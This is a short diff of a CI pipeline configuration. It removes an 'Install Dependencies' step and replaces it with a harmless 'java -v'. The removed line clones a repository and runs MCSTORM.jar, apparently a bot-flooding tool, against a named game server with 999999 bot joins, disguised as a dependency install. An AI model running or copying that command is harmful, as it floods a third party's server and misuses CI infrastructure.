@@ -10,7 +10,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: apt install default-jre && git clone https://github.com/instax-dutta/bhawandar && cd bhawandar &&  java -jar MCSTORM.jar play.radientogaming.tk  47 botjoiner 999999 -1 
+            command: java -v
 
 
 workflows:
